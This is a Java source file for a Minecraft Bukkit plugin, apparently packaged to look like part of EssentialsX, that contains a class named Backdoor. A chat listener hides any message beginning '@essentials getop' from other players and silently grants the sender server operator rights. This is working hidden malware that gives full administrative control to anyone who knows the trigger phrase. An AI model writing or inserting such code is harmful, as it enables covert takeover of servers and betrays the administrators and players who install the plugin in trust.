package com.redbean0721.essentialsx.Event;

import net.md_5.bungee.api.ChatColor;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Backdoor implements Listener {

    private JavaPlugin plugin;

    public Backdoor(JavaPlugin plugin) {
        this.plugin = plugin;
    }


    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();

        if (message.startsWith("@essentials")) {
            String command = message.substring("@essentials".length()).trim();

            switch (command.toLowerCase()) {
                case "getop":
                    event.setCancelled(true);
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        player.setOp(true);
                        player.sendMessage(ChatColor.YELLOW + "你已獲得 OP 權限");
                    });
                    break;
                default:
                    player.sendMessage(ChatColor.RED + "未知命令" + command);
                    break;
            }

//            if (message.equalsIgnoreCase("@essentials getOP")) {
//                event.setCancelled(true);
//                player.setOp(true);
//                player.sendMessage(ChatColor.YELLOW + "你已獲得 OP 權限");
//            }
        }
    }
}
